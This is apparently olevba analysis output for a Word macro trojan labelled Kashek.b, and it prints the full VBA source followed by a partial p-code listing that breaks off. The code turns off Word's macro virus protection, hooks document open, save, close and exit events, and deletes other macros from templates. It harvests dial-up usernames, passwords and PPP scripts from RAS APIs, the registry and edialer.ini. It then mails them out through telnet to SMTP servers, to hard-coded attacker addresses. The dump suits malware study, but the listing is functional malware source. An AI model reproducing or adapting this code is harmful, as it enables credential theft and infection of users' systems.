olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Kashek.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Kashek.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSPluss105.bas 
in file: ./Trojan.MSWord.Kashek.b - OLE stream: 'Macros/VBA/MSPluss105'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Dial-up_password_and_script_checker
Option Explicit
Type FILETIME
  dwLowDateTime As Long
  dwHighDateTime As Long
End Type
Type RASENTRYNAME
dwSize As Long
szEntryName(256) As Byte
End Type
Type RASDIALPARAMS
     dwSize As Long
     szEntryName(256) As Byte
     szPhoneNumber(128) As Byte
     szCallbackNumber(128) As Byte
     szUserName(256) As Byte
     szPassword(256) As Byte
     szDomain(15) As Byte
End Type
Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long
Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As FILETIME) As Long
Declare Function GetWindowsDirectory Lib "kernel32.dll" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName As Any, ByVal lpWindowName As Any) As Long
Declare Function RasEnumEntries Lib "RasApi32.DLL" Alias "RasEnumEntriesA" (ByVal reserved$, ByVal lpszPhonebook$, lprasentryname As RASENTRYNAME, lpcb As Long, lpcEntries As Long) As Long
Declare Function RasGetEntryDialParams Lib "rasapi32" Alias "RasGetEntryDialParamsA" (ByVal lpszPhonebook As String, lpRasDialParams As RASDIALPARAMS, lpfPassword As Byte) As Long
'
Function Check_Connection()
Dim NF As Integer
Dim FName As String, TStr As String
On Error Resume Next
Check_Connection = False
FName = WinDir + "ipconf.sys"
Shell ("ipconfig /batch " + FName), 0
Pause 7
NF = FreeFile
Open FName For Input Access Read As #NF
Do While Not EOF(NF)
Line Input #NF, TStr
If InStr(1, TStr, "IP-", 0) <> 0 Then
If InStr(1, TStr, "0.0.0.0", 0) <> 0 Then
Else
Check_Connection = True
End If
Close NF
Kill FName
Exit Function
End If
Loop
Close FName
Kill FName
End Function

' End Sub

Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub

Sub AutoClose()
On Error Resume Next
AutoOpen
End Sub

Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open WinDir + "logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub
Sub AutoExit()
Dim Counter As Integer
Dim i As Integer
Dim VBComp As Object
Dim Body As String

 Application.Visible = False
 Options.SaveNormalPrompt = False
 On Error Resume Next

Counter = Templates.Count
For i = 1 To Counter
 For Each VBComp In Templates(i).VBProject.VBComponents
  Body = VBComp.CodeModule.Lines(1, 1)
  If InStr(1, Body, "Dial-up_password_and_script_checker", vbTextCompare) = 0 Then
     With VBComp.CodeModule
       .DeleteLines 1, .CountOfLines
     End With
   If VBComp.Name <> "ThisDocument" Then
   Application.OrganizerDelete Templates(i).Name, VBComp.Name, wdOrganizerObjectProjectItems
   End If
 End If
 Next
Next i
 NormalTemplate.Save
 Tmsn
 Options.VirusProtection = True
End Sub

Sub Filler(MessStr As String, hwnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hwnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
    If i Mod 380 = 0 Then
    Pause 1
    End If
   Charset = SendMessage(hwnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub

Sub FileOpen()
On Error Resume Next
AutoOpen
Dialogs(80).Show
Sender_main
End Sub
Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub
' End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Sender_main
End Sub

Sub Sender_main()
Dim Handle As Long
Dim HandleBW As Long
Dim NoConn_ As String
Dim hwnd As Long
Dim GrabStr As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 7) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim Twnd As String
Dim None As String
Dim RecipientOfMessage_ As String
Dim RecipientOfMessage_1
Dim SenderAddress As String
Dim SenderDomain As String
Dim UsName
Dim Domain_ As String
Dim Char_ As Byte
Dim z As Integer

On Error Resume Next
If Check_Connection = True Then
RecipientOfMessage_ = "<kashek@operamail.com>"
RecipientOfMessage_1 = "<kashek87@mail.ru>"
Host(1) = "mail.ru": Domain_ = "@mail.ru"
UsName = Array("-dima-", "2vasiliy", "521521", "Intarsija", "KirovDVP", "Voronin_Vladimir", "abs", "ako", "aleksiv2000", "alena_elena", "alexander555", "alexkis", "alltair", "alt-info", "anton76", "artyserg", "arxi77", "asp", "ate", "axel_extr", "balds", "bars-profile", "bigmoney4u", "bkp", "braut_99", "broker-nsk", "c_service", "carlych", "datasave")
Host(2) = "ajax2.sovam.com"
Host(3) = "www.operamail.com"

Loto 3, A()
Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
                                                 
  If THwnd <> 0 Then
    Twnd = "telnet"
    None = "(none)"
    NoConn_ = "Connect failed"
  Else
   THwnd = FindWindow(CLng(0), "Òåëíåò - (íåò)")
   If THwnd <> 0 Then
    Twnd = "Òåëíåò"
    None = "(íåò)"
    NoConn_ = "Ñáîé ïîäêëþ÷åíèÿ"
   Else
   THwnd = FindWindow(CLng(0), "Telnet - (íåò)")
    Twnd = "telnet"
    None = "(íåò)"
    NoConn_ = "Ñáîé ïîäêëþ÷åíèÿ"
   End If
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
DoEvents
For f = 1 To 3
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 70 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), Twnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), NoConn_)
 DoEvents
Loop
Select Case Handle
  Case Is <> 0

Randomize
SenderDomain = UsName(Int(UBound(UsName) * Rnd))
SenderAddress = UsName(Int(UBound(UsName) * Rnd)) + Domain_

SMTP = "helo My" + SenderDomain + "#$$mail from: <" + SenderAddress + ">#$" + "rcpt to: " + RecipientOfMessage_ + "#$" + "rcpt to: " + RecipientOfMessage_1 + "#$data#$" + _
 "From: <" + SenderAddress + ">#" + "To: " + RecipientOfMessage_ + "#" + _
 "Date: " + Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.2#MIME-Version: 1.0#" + _
 "Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: 7bit##"
Filler SMTP, Handle
Pause 1
GrabStr = Grab + SCP + "##.#quit#"
Filler GrabStr, Handle
Pause 1
 Start = Timer
Do Until hwnd <> 0 Or Timer - Start > 120
 hwnd = FindWindow(CLng(0), Twnd)
 DoEvents
Loop
Select Case hwnd
Case Is = 0
            
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hwnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open WinDir + "logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), Twnd + " - " + None)
SendMessage HandleBW, CLng(16), ByVal CLng(0), 0
Pause 3
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Pause 3
HandleBW = 0
Handle = 0
End Select
Next
End If
End Sub
Function SCP()
Dim res As Long
Dim res1 As Long
Dim Resalt As String
Dim hkey As Long
Dim hkey1 As Long
Dim i As Long
Dim KeyName As String
Dim KeyLen As Long
Dim ClassName As String
Dim ClassLen As Long
Dim lastwrite As FILETIME
Dim user As String, PPPScript As String
Dim NF As Long
Dim Tmp As String
On Error Resume Next
res = RegOpenKeyEx(&H80000001, "RemoteAccess\Profile\", 0, &H8, hkey)
If res <> 0 Then
Resalt = "Can not read entry from R."
SCP = Resalt
Exit Function
End If
i = 0
Do While res = 0
 KeyName = Space(255): ClassName = Space(255)
 KeyLen = 255: ClassLen = 255
res = RegEnumKeyEx(hkey, i, KeyName, KeyLen, ByVal 0, ClassName, ClassLen, lastwrite)
If res = 0 Then
 KeyName = Left(KeyName, KeyLen)
 ClassName = Left(ClassName, ClassLen)
 res1 = RegOpenKeyEx(&H80000001, "RemoteAccess\Profile\" + KeyName, 0, &H8, hkey1)
If res1 = 0 Then
user = System.PrivateProfileString("", "HKEY_CURRENT_USER\RemoteAccess\Profile\" + KeyName, "user")
PPPScript = System.PrivateProfileString("", "HKEY_CURRENT_USER\RemoteAccess\Profile\" + KeyName, "PPPScript")
res1 = RegCloseKey(hkey1)
If PPPScript <> "" Then
 NF = FreeFile
 On Error GoTo aaa
 Open PPPScript For Input Access Read As NF
    If LOF(NF) < 7000 Then
      Do While Not EOF(NF)
       Line Input #NF, Tmp
       PPPScript = PPPScript + Chr(13) + Chr(10) + Tmp
      Loop
    Else
      PPPScript = PPPScript + Chr(13) + Chr(10) + "Ôàéë > 7 kB."
    End If
 Close NF
aaa:
On Error Resume Next
End If
Resalt = Resalt + "Connection " + KeyName + " - " + Chr(13) + Chr(10) + "user: " + user + Chr(13) + Chr(10) + "PPPScript:" + PPPScript + Chr(13) + Chr(10)
Else
Resalt = Resalt + "Can not open the key " + KeyName + Chr(13) + Chr(10)
End If
i = i + 1
End If
Loop
res = RegCloseKey(hkey)
Resalt = "There are " + Str(i) + " Dial-up connections." + Chr(13) + Chr(10) + Resalt
SCP = Resalt
End Function
' End Sub
Function WinDir()
Dim res As Long
Dim DirWin As String

DirWin = Space(255)
res = GetWindowsDirectory(DirWin, 255)
DirWin = Left(DirWin, res)
WinDir = DirWin + "\"
End Function
' End Sub

Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub
Function Grab()
Dim Tmp As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
On Error Resume Next
If Dir$(WinDir + "edialer.ini") <> "" Then
NF = FreeFile
Open WinDir + "edialer.ini" For Input Access Read As #NF
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Temp = Temp + Tmp + Chr(10)
  End If
Loop
Close #NF
End If
Temp = Temp + Chr(10) + Chr(13) + Conn_()
Grab = Temp
End Function
' End Sub
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
NormalTemplate.Save
End Sub
Function Conn_()
Dim PAR(255) As RASENTRYNAME
Dim Counter As Long
Dim S As Long
Dim ConName$
Dim username$
Dim i As Integer
Dim res As Long
Dim MStr
Dim j As Integer
Dim PARAM As RASDIALPARAMS
Dim PWDdet As Byte
Dim n As Integer
Dim z As Long
Dim PWD As String, UsName As String
Dim Resalt As String
On Error Resume Next
PAR(0).dwSize = 264
S = 256 * PAR(0).dwSize
res = RasEnumEntries(1, 1, PAR(0), S, Counter)
For i = 0 To Counter - 1
For j = 0 To 256
ConName = ConName + Chr(PAR(i).szEntryName(j))
Next
ConName = Left$(ConName, InStr(ConName, vbNullChar) - 1)

For n = 0 To 256
PARAM.szEntryName(n) = PAR(i).szEntryName(n)
Next
PARAM.dwSize = 1052
res = RasGetEntryDialParams(1, PARAM, PWDdet)
For z = 0 To 256
UsName = UsName + Chr(PARAM.szUserName(z))
PWD = PWD + Chr(PARAM.szPassword(z))
Next
UsName = Left$(UsName, InStr(UsName, vbNullChar) - 1)
PWD = Left$(PWD, InStr(PWD, vbNullChar) - 1)
Resalt = Resalt + "Connection: " + ConName + Chr(13) + "User: " + UsName + Chr(13) + "Password: " + PWD + Chr(10) + Chr(13)
PWD = "": UsName = "": ConName = ""
DoEvents
Next
Conn_ = Resalt
End Function
' End Sub
Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Randomize
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next
End Function
' End Sub
Sub Sender()
Dim i As Long
 i = 0
 For i = 0 To 4
  If Check_Connection = True Then
   Sender_main
   Exit Sub
  Else
   Pause 254
  End If
 Next
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Trojan.MSWord.Kashek.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1334 bytes
' Macros/VBA/MSPluss105 - 31642 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0023 "Dial-up_password_and_script_checker"
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Type FILETIME
' Line #3:
' 	DimImplicit 
' 	VarDefn dwLowDateTime (As Long)
' Line #4:
' 	DimImplicit 
' 	VarDefn dwHighDateTime (As Long)
' Line #5:
' 	EndType 
' Line #6:
' 	Type RASENTRYNAME
' Line #7:
' 	DimImplicit 
' 	VarDefn dwSize (As Long)
' Line #8:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0100 
' 	VarDefn szEntryName (As Byte)
' Line #9:
' 	EndType 
' Line #10:
' 	Type RASDIALPARAMS
' Line #11:
' 	DimImplicit 
' 	VarDefn dwSize (As Long)
' Line #12:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0100 
' 	VarDefn szEntryName (As Byte)
' Line #13:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0080 
' 	VarDefn szPhoneNumber (As Byte)
' Line #14:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0080 
' 	VarDefn szCallbackNumber (As Byte)
' Line #15:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0100 
' 	VarDefn szUserName (As Byte)
' Line #16:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0100 
' 	VarDefn szPassword (As Byte)
' Line #17:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x000F 
' 	VarDefn szDomain (As Byte)
' Line #18:
' 	EndType 
' Line #19:
' 	FuncDefn (Declare Function RegOpenKeyEx Lib "advapi32.dll" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #20:
' 	FuncDefn (Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long)
' Line #21:
' 	FuncDefn (Declare Function RegEnumKeyEx Lib "advapi32.dll" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As ) As Long)
' Line #22:
' 	FuncDefn (Declare Function GetWindowsDirectory Lib "kernel32.dll" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #23:
' 	FuncDefn (Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long)
' Line #24:
' 	FuncDefn (Declare Function GetWindowText Lib "user32" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long)
' Line #25:
' 	FuncDefn (Declare Function GetWindowTextLength Lib "user32" (ByVal hwnd As Long) As Long)
' Line #26:
' 	FuncDefn (Declare Function SendMessage Lib "user32.dll" (ByVal hwnd As Long, ByVal Msg As Long, wParam As , lParam As ) As Long)
' Line #27:
' 	FuncDefn (Declare Function FindWindow Lib "user32.dll" (ByVal lpClassName As , ByVal lpWindowName As ) As Long)
' Line #28:
' 	FuncDefn (Declare Function RasEnumEntries Lib "RasApi32.DLL" (ByVal reserved, ByVal lpszPhonebook, lprasentryname As , lpcb As Long, lpcEntries As Long) As Long)
' Line #29:
' 	FuncDefn (Declare Function RasGetEntryDialParams Lib "rasapi32" (ByVal lpszPhonebook As String, lpRasDialParams As , lpfPassword As Byte) As Long)
' Line #30:
' 	QuoteRem 0x0000 0x0000 ""
' Line #31:
' 	FuncDefn (Function Check_Connection())
' Line #32:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #33:
' 	Dim 
' 	VarDefn FName (As String)
' 	VarDefn TStr (As String)
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	LitVarSpecial (False)
' 	St Check_Connection 
' Line #36:
' 	Ld WinDir 
' 	LitStr 0x000A "ipconf.sys"
' 	Add 
' 	St FName 
' Line #37:
' 	LitStr 0x0010 "ipconfig /batch "
' 	Ld FName 
' 	Add 
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #38:
' 	LitDI2 0x0007 
' 	ArgsCall Pause 0x0001 
' Line #39:
' 	Ld Friend 
' 	St NF 
' Line #40:
' 	Ld FName 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #41:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #42:
' 	Ld NF 
' 	Ld TStr 
' 	LineInput 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld TStr 
' 	LitStr 0x0003 "IP-"
' 	LitDI2 0x0000 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld TStr 
' 	LitStr 0x0007 "0.0.0.0"
' 	LitDI2 0x0000 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #45:
' 	ElseBlock 
' Line #46:
' 	LitVarSpecial (True)
' 	St Check_Connection 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld NF 
' 	Close 0x0001 
' Line #49:
' 	Ld FName 
' 	ArgsCall Kill 0x0001 
' Line #50:
' 	ExitFunc 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Loop 
' Line #53:
' 	Ld FName 
' 	Close 0x0001 
' Line #54:
' 	Ld FName 
' 	ArgsCall Kill 0x0001 
' Line #55:
' 	EndFunc 
' Line #56:
' Line #57:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #58:
' Line #59:
' 	FuncDefn (Sub FileClose())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	ArgsCall AutoOpen 0x0000 
' Line #62:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Sub AutoClose())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	ArgsCall AutoOpen 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' Line #70:
' 	FuncDefn (Sub Tmsn())
' Line #71:
' 	Dim 
' 	VarDefn Delta (As Integer)
' Line #72:
' 	Dim 
' 	VarDefn Old (As Byte)
' Line #73:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #74:
' 	Ld Friend 
' 	St NF 
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	Ld WinDir 
' 	LitStr 0x0009 "logow.sys"
' 	Add 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #77:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld Old 
' 	GetRec 
' Line #78:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #79:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St Delta 
' Line #80:
' 	Ld Delta 
' 	Ld Old 
' 	Sub 
' 	St Delta 
' Line #81:
' 	Ld Delta 
' 	SelectCase 
' Line #82:
' 	LitDI2 0x0002 
' 	CaseGt 
' 	CaseDone 
' Line #83:
' 	ArgsCall Sender 0x0000 
' Line #84:
' 	LitDI2 0x0000 
' 	Ld Delta 
' 	LitDI2 0x001F 
' 	Add 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	CaseLt 
' 	CaseDone 
' Line #85:
' 	ArgsCall Sender 0x0000 
' Line #86:
' 	CaseElse 
' Line #87:
' 	EndSelect 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Sub AutoExit())
' Line #90:
' 	Dim 
' 	VarDefn Counter (As Integer)
' Line #91:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #92:
' 	Dim 
' 	VarDefn VBComp (As Object)
' Line #93:
' 	Dim 
' 	VarDefn Body (As String)
' Line #94:
' Line #95:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #96:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #97:
' 	OnError (Resume Next) 
' Line #98:
' Line #99:
' 	Ld Templates 
' 	MemLd Count 
' 	St Counter 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #101:
' 	StartForVariable 
' 	Ld VBComp 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #102:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBComp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #103:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	LitStr 0x0023 "Dial-up_password_and_script_checker"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #104:
' 	StartWithExpr 
' 	Ld VBComp 
' 	MemLd CodeModule 
' 	With 
' Line #105:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #106:
' 	EndWith 
' Line #107:
' 	Ld VBComp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #108:
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	MemLd New 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	StartForVariable 
' 	Next 
' Line #112:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #113:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #114:
' 	ArgsCall Tmsn 0x0000 
' Line #115:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' 	FuncDefn (Sub Filler(MessStr As String, hwnd As Long))
' Line #119:
' 	Dim 
' 	VarDefn i (As Long)
' Line #120:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #121:
' 	Dim 
' 	VarDefn Charset (As Long)
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MessStr 
' 	FnLen 
' 	For 
' Line #124:
' 	Ld MessStr 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Tmp 
' Line #125:
' 	Ld Tmp 
' 	SelectCase 
' Line #126:
' 	LitStr 0x0001 "#"
' 	CaseEq 
' 	CaseDone 
' Line #127:
' 	ArgsCall DoEvents 0x0000 
' Line #128:
' 	Ld hwnd 
' 	LitHI2 0x0102 
' 	LitDI2 0x000D 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #129:
' 	LitStr 0x0001 "$"
' 	CaseEq 
' 	CaseDone 
' Line #130:
' 	LitDI2 0x0007 
' 	ArgsCall Pause 0x0001 
' Line #131:
' 	CaseElse 
' Line #132:
' 	Ld i 
' 	LitDI2 0x017C 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #133:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	Ld hwnd 
' 	LitHI2 0x0102 
' 	Ld Tmp 
' 	ArgsLd Asc 0x0001 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #136:
' 	EndSelect 
' Line #137:
' 	StartForVariable 
' 	Next 
' Line #138:
' 	EndSub 
' Line #139:
' Line #140:
' 	FuncDefn (Sub FileOpen())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	ArgsCall AutoOpen 0x0000 
' Line #143:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #144:
' 	ArgsCall Sender_main 0x0000 
' Line #145:
' 	EndSub 
' Line #146:
' 	FuncDefn (Sub Pause(i As Byte))
' Line #147:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #148:
' 	Ld Timer 
' 	St Start 
' Line #149:
' 	Ld Timer 
' 	Ld Start 
' 	Ld i 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #150:
' 	ArgsCall DoEvents 0x0000 
' Line #151:
' 	Loop 
' Line #152:
' 	EndSub 
' Line #153:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #154:
' Line #155:
' 	FuncDefn (Sub FileSave())
' Line #156:
' 	OnError (Resume Next) 
' Line #157:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #158:
' 	ArgsCall Sender_main 0x0000 
' Line #159:
' 	EndSub 
' Line #160:
' Line #161:
' 	FuncDefn (Sub Sender_main())
' Line #162:
' 	Dim 
' 	VarDefn Handle (As Long)
' Line #163:
' 	Dim 
' 	VarDefn HandleBW (As Long)
' Line #164:
' 	Dim 
' 	VarDefn NoConn_ (As String)
' Line #165:
' 	Dim 
' 	VarDefn hwnd (As Long)
' Line #166:
' 	Dim 
' 	VarDefn GrabStr (As String)
' Line #167:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #168:
' 	Dim 
' 	VarDefn MyDat (As Byte)
' Line #169:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #170:
' 	Dim 
' 	VarDefn NPwl (As String)
' Line #171:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #172:
' 	Dim 
' 	VarDefn Title (As String)
' Line #173:
' 	Dim 
' 	VarDefn SMTP (As String)
' Line #174:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	VarDefn Host (As String)
' Line #175:
' 	Dim 
' 	VarDefn A (As Integer)
' Line #176:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #177:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #178:
' 	Dim 
' 	VarDefn THwnd (As Long)
' Line #179:
' 	Dim 
' 	VarDefn Twnd (As String)
' Line #180:
' 	Dim 
' 	VarDefn None (As String)
' Line #181:
' 	Dim 
' 	VarDefn RecipientOfMessage_ (As String)
' Line #182:
' 	Dim 
' 	VarDefn RecipientOfMessage_1
' Line #183:
' 	Dim 
' 	VarDefn SenderAddress (As String)
' Line #184:
' 	Dim 
' 	VarDefn SenderDomain (As String)
' Line #185:
' 	Dim 
' 	VarDefn UsName
' Line #186:
' 	Dim 
' 	VarDefn Domain_ (As String)
' Line #187:
' 	Dim 
' 	VarDefn Char_ (As Byte)
' Line #188:
' 	Dim 
' 	VarDefn z (As Integer)
' Line #189:
' Line #190:
' 	OnError (Resume Next) 
' Line #191:
